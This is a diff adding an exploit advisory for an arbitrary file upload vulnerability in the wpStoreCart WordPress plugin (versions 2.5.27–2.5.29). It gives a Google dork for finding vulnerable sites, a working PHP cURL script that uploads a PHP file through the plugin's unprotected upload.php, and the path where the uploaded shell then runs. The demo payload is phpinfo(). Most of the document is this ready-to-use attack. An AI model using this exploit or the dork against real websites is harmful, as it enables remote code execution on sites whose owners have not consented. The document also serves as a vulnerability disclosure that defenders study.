@@ -1,0 +1,38 @@
+##################################################
+# Description : Wordpress Plugins - wpStoreCart Arbitrary File Upload 
+Vulnerability
+# Version : 2.5.27 - 2.5.29
+# Link : http://wordpress.org/extend/plugins/wpstorecart/
+# Plugins : http://downloads.wordpress.org/plugin/wpstorecart.2.5.29.zip
+# Date : 03-06-2012
+# Google Dork : inurl:/wp-content/plugins/wpstorecart/
+# Author : Sammy FORGIT - sam at opensyscom dot fr - 
+http://www.opensyscom.fr
+##################################################
+
+
+Exploit :
+
+PostShell.php
+<?php
+
+$uploadfile="lo.php";
+$ch = 
+curl_init("http://www.exemple.com/wordpress/wp-content/plugins/wpstorecart/php/upload.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+         array('Filedata'=>"@$uploadfile"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
+
+Shell Access :
+http://www.exemple.com/wordpress/wp-content/uploads/wpstorecart/lo.php
+
+lo.php
+<?php
+phpinfo();
+?>
